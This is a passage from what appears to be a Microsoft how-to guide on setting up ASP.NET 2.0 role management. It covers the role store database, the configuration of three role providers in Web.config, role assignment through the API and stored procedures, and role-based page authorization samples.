<em>sqlinstance</em>-<strong>A r</strong> </p><p>Note that this program is located in the <strong>%windir%\Microsoft.NET\Framework\{version}</strong> folder. </p><p>When you type the command, replace <em>version</em> with the version of the .NET Framework that you are using and <em>sqlinstance</em> with the name of the SQL Server instance you want to install the role management database in. </p><p>You will see the following output: </p><div><pre>Start adding the following features:<br>Rolemanager<br>............<br>Finished.  </pre></div><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;For information about the switches for Aspnet_regsql.exe, type <strong>Aspnet_regsql.exe -?</strong> at the command prompt.</blockquote></li></ol><p><strong>To grant permissions in the database</strong></p><p>You need to create a database login for your Web application's process account; by default, this is the Network Service account. If you have configured a custom account to run ASP.NET, you must grant permissions to that account. </p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;If you have configured your ASP.NET application to use impersonation, your ASP.NET application executes using the security context of the original caller. To access data in a SQL Server database, you must usually create a database login for the original caller and grant access to the required data.</blockquote><blockquote>However, the role management system accesses the Aspnetdb database by using the process identity regardless of whether your application uses impersonation. </blockquote><ol><li>Open SQL Server Enterprise Manager, expand <strong>Security</strong>, and then expand <strong>Logins</strong> for the server hosting the role management database. Create a new login for your Web application's process account (for example, <strong>NT AUTHORITY/Network Service</strong>). </li><li>Set the default database to <strong>Aspnetdb</strong>. </li><li>Under the <strong>Databases</strong> node in Enterprise Manager, expand the <strong>Aspnetdb</strong> database entry, and then click <strong>Roles</strong>. Right-click <strong>aspnet_Roles_FullAccess</strong>, and then click <strong>Properties</strong>. In the <strong>Database Role Properties</strong> dialog box, click <strong>Add</strong>, and then select the database login you created in the previous step to add the login to that role. <blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;Aspnet_regsql.exe creates three database roles with differing levels of access to the role management database: </blockquote><ul><li><strong>FullAccess</strong> gives rights to create and delete roles, and add and remove users from those roles. </li><li><strong>BasicAccess</strong> allows role membership checks for the current user only. </li><li><strong>ReportingAccess</strong> allows a page to check which roles exist and which users belong to them. </li></ul></li></ol><h2>Using WindowsTokenRoleProvider</h2><p>You use the <strong>WindowsTokenRoleProvider</strong> with ASP.NET applications that use Windows authentication. It is a read-only provider that retrieves role information for a Windows user based on Windows security groups. You cannot create, add to, or delete roles with this provider. Instead, you must use the Windows Computer Management or Active Directory Users and Computers administration tools.</p><p>The Windows security system acts as role store for this provider, so no additional configuration is required to set up the role store.</p><h2>Using AuthorizationStoreRoleProvider</h2><p>Use the <strong>AuthorizationStoreRoleProvider</strong> to store roles data in an AzMan policy store in an XML file, in Active Directory, or ADAM. </p><p>AzMan is supported on Windows 2000 Server or later and on Windows XP Professional.&nbsp; </p><h1>Step 2. Configure Your Role Provider in Web.config</h1><p>In this step, you configure the appropriate role provider in your application's Web.config file.</p><h2>Using SqlRoleProvider</h2><p>To use the role store in the default SQL Express instance in a database in your Web site's \app_dir folder, add the following configuration to your application's Web.config file.</p><div><pre>&lt;system.web&gt;<br>&nbsp;&nbsp;&nbsp; &lt;roleManager enabled="true" /&gt;<br>&lt;/system.web&gt;  </pre></div><p>This configuration enables role management and causes your application to use the default provider named <strong>AspNetSqlRoleProvider</strong> defined in the Machine.config file. This uses the local SQL Express instance.</p><p>To use a role store in SQL Server, add a connection string to point to your role database and add a role provider definition in the Web.config file, as shown here.</p><div><pre>&lt;configuration&gt;<br>&nbsp; &lt;connectionStrings&gt;<br>&nbsp;&nbsp;&nbsp; &lt;add name="SqlRoleManagerConnection" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connectionString="Data Source=sqlinstance;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Initial Catalog=aspnetdb;Integrated Security=SSPI;"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/add&gt;<br>&nbsp; &lt;/connectionStrings&gt;<br>&lt;/configuration&gt;</pre></div><pre>&lt;roleManager enabled="true" defaultProvider="SqlRoleManager"&gt;<br>&nbsp; &lt;providers&gt;<br>&nbsp;&nbsp;&nbsp; &lt;add name="SqlRoleManager" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; type="System.Web.Security.SqlRoleProvider"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connectionStringName="SqlRoleManagerConnection"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; applicationName="MyApplication" /&gt;<br>&nbsp; &lt;/providers&gt;<br>&lt;/roleManager&gt;</pre><h2>Using WindowsTokenRoleProvider</h2><p>The Windows security system acts as role store for this provider, and Windows groups represent roles. You can use this provider when you use Windows authentication. To do this, add the following configuration to your application's Web.config file.</p><div><pre>&lt;authentication mode="Windows" /&gt;<br>&lt;roleManager enabled="true" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; defaultProvider="AspNetWindowsTokenRoleProvider" /&gt;  </pre></div><p>This configuration enables role management and uses the role provider named <strong>AspNetWindowsTokenRoleProvider</strong>, which is defined in the Machine.config file.</p><h2>Using AuthorizationStoreRoleProvider</h2><p>The <strong>AuthorizationStoreRoleProvider</strong> is used to store roles data in an AzMan policy store in an XML file, in Active Directory, or in ADAM. To configure this provider, add a connection string to point to the relevant policy store and then add a role provider definition in the Web.config file.</p><p>The following connection string refers to an XML-based policy store contained in a file named Azmanstore.xml.</p><div><pre>&lt;configuration&gt; <br>&nbsp; &lt;connectionStrings&gt; <br>&nbsp;&nbsp;&nbsp; &lt;add name="AzManPolicyStoreConnectionString" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connectionString="msxml://c:/RolesData/azmanstore.xml" /&gt;<br>&nbsp; &lt;/connectionStrings&gt; <br>&lt;/configuration&gt;  </pre></div><p>The following connection string refers to an ADAM-based policy store.</p><div><pre>&lt;configuration&gt; <br>&nbsp; &lt;connectionStrings&gt; <br>&nbsp;&nbsp;&nbsp; &lt;add name="AzManPolicyStoreConnectionString" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connectionString= "msldap://servername:port/CN=AzManADAMStore,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OU=SecNetPartition,O=SecNet,C=US"/&gt;<br>&nbsp; &lt;/connectionStrings&gt; <br>&lt;/configuration&gt;  </pre></div><p>The following configuration shows how to enable role management and use the provider named <strong>RoleManagerAzManADAMProvider</strong>. This uses the connection string shown earlier to connect to an ADAM policy store.</p><div><pre>&lt;roleManager <br>&nbsp;&nbsp;&nbsp; enabled="true" <br>&nbsp;&nbsp;&nbsp; cacheRolesInCookie="true" <br>&nbsp;&nbsp;&nbsp; defaultProvider="RoleManagerAzManADAMProvider"<br>&nbsp;&nbsp;&nbsp; cookieName=".ASPXROLES" <br>&nbsp;&nbsp;&nbsp; cookiePath="/" <br>&nbsp;&nbsp;&nbsp; cookieTimeout="30" <br>&nbsp;&nbsp;&nbsp; cookieRequireSSL="false" <br>&nbsp;&nbsp;&nbsp; cookieSlidingExpiration="true"<br>&nbsp;&nbsp;&nbsp; createPersistentCookie="false" <br>&nbsp;&nbsp;&nbsp; cookieProtection="All"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;providers&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;add name="RoleManagerAzManADAMProvider"<br>&nbsp;&nbsp;&nbsp;&nbsp; type="System.Web.Security.AuthorizationStoreRoleProvider, System.Web,<br>     Version=3.5.0.0, Culture=neutral, publicKeyToken=b03f5f7f11d50a3a"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; connectionStringName="AzManPolicyStoreConnectionString" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; applicationName="AzManDemo"/&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/providers&gt;<br>&lt;/roleManager&gt;  </pre></div><h1>Step 3. Create and Assign Roles</h1><p>In this step, you create roles for your application and assign users to those roles. There are several methods you can use to create and assign roles. Using them depends on how your application authenticates its users and which role provider it uses. The various methods for creating and assigning users to roles include: </p><ul><li>At development time, you can use the ASP.NET configuration tool. </li><li>If you are using the <strong>AuthorizationStoreRoleProvider</strong>, you can use the AzMan administrator Microsoft Management Console (MMC) snap-in. </li><li>You can create roles programmatically by using either the role management APIs or, if you are using the <strong>SqlRoleProvider</strong>, by executing SQL scripts to add them to the database directly. </li><li>If you are using the <strong>WindowsTokenRoleProvider</strong>, you use the Windows Computer Management tool or Active Directory Users and Computers to create Windows groups which are used as roles. </li></ul><h2>Using the ASP.NET Web Site Configuration Tool</h2><p>You can use the ASP.NET Web Site Configuration tool from Visual Studio .NET at development time if your application uses Forms authentication and you have configured your application to use the ASP.NET membership feature. If your application uses Windows authentication, you cannot use this tool and you must use either the Roles API or the AzMan administrator MMC snap-in as described in the next section. </p><h3>To assign users to roles by using the ASP.NET Web Site Configuration tool </h3><ol><li>Create roles by using the ASP.NET configuration tool by performing the following steps: <ol><li>Start Visual Studio. </li><li>On the <strong>Website</strong> menu, click <strong>ASP.NET Configuration</strong>. </li><li>On the <strong>Home</strong> tab, click <strong>Security</strong>. </li><li>Click <strong>Create or</strong> <strong>Manage Roles</strong>. </li><li>Use the form to add your application roles. </li></ol></li><li>Assign users to roles as follows: <ol><li>In Visual Studio .NET, click <strong>ASP.NET Configuration </strong>on the <strong>Website</strong> menu. </li><li>On the <strong>Home</strong> tab, click <strong>Security</strong>. </li><li>Click <strong>Create or</strong> <strong>Manage Roles</strong>. </li><li>In the <strong>Add/Remove Users</strong> column, click <strong>Manage</strong> for a role you have created. This opens a form where you can add or remove users from the role. </li></ol></li></ol><h2>Using the AzMan Administrator MMC Snap-In</h2><p>This tool is provided for applications that use an AzMan store to manage its users and roles. It is particularly convenient for applications using Windows authentication that cannot use the ASP.NET configuration tool to assign users to roles. </p><h2>Using SQL Scripts</h2><p>If you have suitable permissions on the role management database, you can run a SQL script to call the various stored procedures provided with the Aspnetdb database. For example, the following script creates a new role in an application and adds a user to it.</p><div><pre>EXEC aspnet_Roles_CreateRole 'ThisApplication', 'NewRole'<br>EXEC aspnet_UsersInRoles_AddUsersToRoles 'ThisApplication', 'ThisUser', 'NewRole', 8  </pre></div><p>There are 19 role-managing stored procedures created inside the role management database. Most of these stored procedures have purposes analogous to calls in the role management API. </p><h2>Using the Role Management APIs</h2><p>You can assign users to roles or remove users from roles by using methods of the <strong>System.Web.Security.Roles</strong> class. You can also check for the user's role membership and authorize as appropriate.</p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;Because the <strong>WindowsTokenRoleProvider</strong> is read-only, it supports only the <strong>IsUserInRole</strong> and <strong>GetRolesForUser </strong>methods.<strong> </strong></blockquote><p>The following code shows how to create new roles.</p><div><pre>using System.Web.Security;</pre><pre>if (!Roles.RoleExists("TestRole"))<br>{<br>&nbsp; Roles.CreateRole("TestRole");<br>}  </pre></div><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;Role names are not case sensitive. If you attempt to create the same role twice, an exception is thrown.</blockquote><p>The following code shows how to add uses to roles.</p><div><pre>// Example 1 - Add one user to one role<br>Roles.AddUserToRole("TestOne", "ExampleRole1");</pre><pre>// Example 2 - Add one user to several roles<br>Roles.AddUserToRoles("TestTwo", <br>&nbsp; new string[] { "ExampleRole1", "ExampleRole2" });</pre><pre>// Example 3 - Add several users to one roles<br>Roles.AddUsersToRole(<br>&nbsp; new string[] { "TestTwo", "TestThree" }, "ExampleRole3");</pre><pre>// Example 4 - Add several users to several roles<br>Roles.AddUsersToRoles(<br>&nbsp; new string[] { "TestThree", "TestFour" }, <br>&nbsp; new string[] { "ExampleRole4" }); </pre></div><p>The following code shows how to remove users from roles.</p><div><pre>// Example 1 - Add one user to one role<br>Roles.RemoveUserFromRole("TestOne", "ExampleRole1");</pre><pre>// Example 2 - Add one user to several roles<br>Roles.RemoveUserFromRoles("TestTwo", <br>&nbsp; new string[] { "ExampleRole1", "ExampleRole2" });</pre><pre>// Example 3 - Add several users to one roles<br>Roles.RemoveUsersFromRole(<br>&nbsp; new string[] { "TestTwo", "TestThree" }, "ExampleRole3");</pre><pre>// Example 4 - Add several users to several roles<br>Roles.RemoveUsersFromRoles(<br>&nbsp; new string[] { "TestThree", "TestFour" }, <br>&nbsp; new string[] { "ExampleRole4" }); </pre></div><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;Both the <strong>AddUser</strong> and <strong>RemoveUser</strong> methods throw a <strong>TargetInvocationException</strong> if you specify a role that does not exist or if you specify an invalid Windows user account name. The inner exception gives the reason for the failure. None of the methods mentioned earlier can be used against a <strong>WindowsTokenRoleProvider</strong>.</blockquote><h1>Step 4. Perform Role-Based Authorization </h1><p>In this step, you create test applications that use role management. This step provides two samples: </p><ul><li>The first sample uses the <strong>SqlRoleProvider</strong> or <strong>AuthorizationStoreRoleProvider</strong>, in which the application assigns a role to a user, removes a role from a user, and tests for role membership. </li><li>The second sample uses the <strong>WindowsTokenRoleProvider</strong> to check which Windows groups (roles) the current user is a member of. The <strong>WindowsTokenRoleProvider</strong> supports only the<strong> IsUserInRole </strong>and <strong>GetRolesForUser </strong>methods of the role management API, and it does not allow you to create, assign to, or remove users from Windows groups. </li></ul><p>Both of these sample applications use Integrated Windows authentication in Microsoft Internet Information Services (IIS) to authenticate callers. This is a requirement when using the <strong>WindowsTokenRoleProvider</strong>, but if you are using the <strong>SqlRoleProvider</strong> or <strong>AuthorizationStoreRoleProvider</strong>, you could use alternative authentication such as forms authentication.</p><h2>Sample: Using SqlRoleProvider or AuthorizationStoreRoleProvider</h2><p>This sample uses the <strong>SqlRoleProvider</strong> or <strong>AuthorizationStoreRoleProvider</strong>.</p><h3>To test role management with SqlRoleProvider or AuthorizationStoreRoleProvider </h3><ol><li>Use Visual Studio to create a Web site, add a Web.config file, and configure the role store and <strong>SqlRoleProvider</strong> or <strong>AuthorizationStoreRoleProvider</strong> as described in steps 1 and 2 of this How to. </li><li>Using the Internet Information Services MMC snap-in, edit the properties of the Web site. Edit the <strong>Anonymous access and authentication control</strong> on the <strong>Directory</strong> <strong>security</strong> tab. Clear the <strong>Anonymous access</strong> check box and select the <strong>Integrated Windows authentication</strong> check box. </li><li>In the Web.config file, enable Windows authentication. <div><pre>&lt;system.web&gt;<br>&nbsp;&nbsp;&nbsp; ...<br>&nbsp;&nbsp;&nbsp; &lt;authentication mode="Windows"/&gt;<br>&nbsp;&nbsp;&nbsp; ...<br>&lt;/system.web&gt;  </pre></div></li><li>Add the following code to the Default.aspx file. <div><pre>&lt;%@ Page Language="C#" %&gt;<br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "<a href="http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd</a>"&gt;<br>&lt;script runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; protected void Page_Load(object sender, EventArgs e)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!Roles.RoleExists("TestRole"))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Roles.CreateRole("TestRole");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ShowRoleMembership();<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; private void ShowRoleMembership()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (Roles.IsUserInRole("TestRole"))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Label1.Text = User.Identity.Name + " is in role TestRole";<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Label1.Text = User.Identity.Name + " is NOT in role TestRole";<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; protected void Button1_Click(object sender, EventArgs e)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Roles.AddUserToRole(User.Identity.Name, "TestRole");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ShowRoleMembership();<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; protected void Button2_Click(object sender, EventArgs e)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Roles.RemoveUserFromRole(User.Identity.Name, "TestRole");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ShowRoleMembership();<br>&nbsp;&nbsp;&nbsp; }<br>&lt;/script&gt;<br>&lt;html&nbsp; &gt;<br>&lt;head runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;title&gt;Untitled Page&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&nbsp;&nbsp;&nbsp; &lt;form id="form1" runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;div&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Button ID="Button1" runat="server" Text="Add to role" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OnClick="Button1_Click" /&gt;&lt;br /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;br /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Button ID="Button2" runat="server" Text="Remove from role" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OnClick="Button2_Click" /&gt;&lt;br /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;br /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Label ID="Label1" runat="server" /&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/div&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html  </pre></div></li><li>Run the application. Note the following features about this application: <ol><li>When you browse to the application, the code in the <strong>Page_Load</strong> event handler creates the role <strong>TestRole</strong> if it does not already exist. <ul><li>The text of <strong>Label1</strong> shows whether the current authenticated user is a member of the <strong>TestRole</strong> role. </li><li>When you click the <strong>Add to role</strong> button, the code in the <strong>Button1_Click</strong> event handler uses the role management API to add the current authenticated user to the <strong>TestRole</strong> role. </li><li>If you click the <strong>Add to role</strong> button again before clicking the <strong>Remove from role</strong> button, the call to <strong>Roles.AddUserToRole</strong> throws an exception because the user is already in the role <strong>TestUser</strong>. You must code for this condition in your applications. </li><li>When you click the <strong>Remove from role</strong> button, the current authenticated user is removed from the role <strong>TestRole</strong>. </li><li>If you click the <strong>Remove from role</strong> button again before clicking the <strong>Add to role</strong> button, the call to <strong>Roles.RemoveUserFromRole</strong> throws an exception because the user is already not in the role <strong>TestUser</strong> and cannot be removed twice. You must code for this condition in your applications. </li></ul></li></ol></li></ol><p><strong>To control access to pages and folders using roles</strong></p><p>A typical use for roles is to establish rules that allow or deny access to pages or folders. You can set up such access rules in the &lt;<strong>authorization</strong>&gt; section of the Web.config file. The following example allows users in the role of members to view pages in the folder named <strong>memberPages</strong> and denies access to anyone else.</p><div><pre>&lt;configuration&gt;<br>&nbsp;&nbsp; &lt;location path="memberPages"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;system.web&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;authorization&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;allow roles="Manager" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;deny users="*" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/authorization&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/system.web&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/location&gt;<br>&nbsp;&nbsp; &lt;!-- other configuration settings here --&gt;<br>&lt;configuration&gt;  </pre></div><h2>Sample: Using WindowsTokenRoleProvider</h2><p>This sample uses the <strong>WindowsTokenRoleProvider</strong>.</p><h3>To test role management with WindowsTokenRoleProvider </h3><ol><li>Use Visual Studio&nbsp;to create a Web site, add a Web.config file, and configure the <strong>WindowsTokenRoleProvider</strong> as described in step 2 of this How to. </li><li>Using the Internet Information Services MMC snap-in, edit the properties of the Web site. Edit the <strong>Anonymous access and authentication control</strong> on the <strong>Directory security</strong> tab. Clear the <strong>Anonymous access</strong> check box and select the <strong>Integrated Windows Authentication</strong> check box. </li><li>In the Web.config file, enable Windows authentication. <div><pre>&lt;system.web&gt;<br>&nbsp;&nbsp;&nbsp; ...<br>&nbsp;&nbsp;&nbsp; &lt;authentication mode="Windows"/&gt;<br>&nbsp;&nbsp;&nbsp; ...<br>&lt;/system.web&gt;  </pre></div></li><li>Add the following code to Default.aspx. <div><div><div></div></div><pre>&lt;%@ Page Language="C#" %&gt;<br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "<a href="http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd</a>"&gt;<br>&lt;script runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; protected void Page_Load(object sender, EventArgs e)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string[] members = Roles.GetRolesForUser();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (string role in members)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Label1.Text += role + "&lt;br /&gt;";<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; } <br>&lt;/script&gt;<br>&lt;html&nbsp; &gt;<br>&lt;head runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;title&gt;Untitled Page&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&nbsp;&nbsp;&nbsp; &lt;form id="form1" runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;div&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:Label ID="Label1" runat="server" /&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/div&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;  </pre></div></li><li>Run the application. A list of roles that correspond to the Windows groups that the authenticated user is a member of is displayed. Note the following features about this application: <ol><li>Because <strong>WindowsTokenRoleProvider</strong> is read-only, you cannot create, assign to, or remove users from roles. The <strong>WindowsTokenRoleProvider</strong> supports only the <strong>IsUserInRole </strong>and <strong>GetRolesForUser</strong> methods of the role management API. </li></ol></li></ol><ul><li>The text of <strong>Label1</strong> shows which Windows groups the currently logged on user is a member of. </li><li>The <strong>WindowsPrincipal </strong>class supports an override of the <strong>IsInRole</strong> method that accepts a <strong>WindowsBuiltinRole</strong> enumeration. This method allows you to test against membership of common Windows groups. The <strong>WindowsBuiltInRole</strong> enumeration contains members representing common groups such as Administrators, Guest, PowerUser, and User as shown here. <div><div><div></div><div>&nbsp;</div></div><pre>WindowsPrincipal User = new <br>&nbsp; WindowsPrincipal((WindowsIdentity)HttpContext.Current.User.Identity);<br>if (User.IsInRole(WindowsBuiltInRole.PowerUser))<br>{<br>&nbsp; ...<br>}  </pre></div></li></ul><p><strong>To control access to pages and folders using built-in roles with the WindowsTokenRoleProvider</strong></p><p>You can control access to pages or folders to members of one of the built-in Windows groups by specifying the role in the format <strong>BUILTIN\<em>groupName</em></strong>. The following example allows users in the built-in administrators group to view pages in the folder named memberPages and denies access to anyone else.</p><div><pre>&lt;configuration&gt;<br>&nbsp;&nbsp; &lt;location path="memberPages"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;system.web&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;authorization&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;allow roles="BUILTIN\Administrators" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;deny users="*" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/authorization&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/system.web&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/location&gt;<br>&nbsp;&nbsp; &lt;!-- other configuration settings here --&gt;<br>&lt;/configuration  </pre></div><h1>Additional Considerations</h1><p>If a user's browser accepts cookies, you can store role information for that user in a cookie on the user's computer. On each page request, ASP.NET reads the role information for that user from the cookie. This can improve application performance by reducing the amount of communication required with the roles data store. </p><p>To configure and enable role caching, set <strong>cacheRolesInCookie = true</strong> as shown here.</p><div><pre>&lt;roleManager enabled="true" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cacheRolesInCookie="true" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cookieName=".ASPXROLES"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cookieTimeout="30" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cookiePath="/" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cookieRequireSSL="false" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cookieSlidingExpiration="true"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cookieProtection="All" 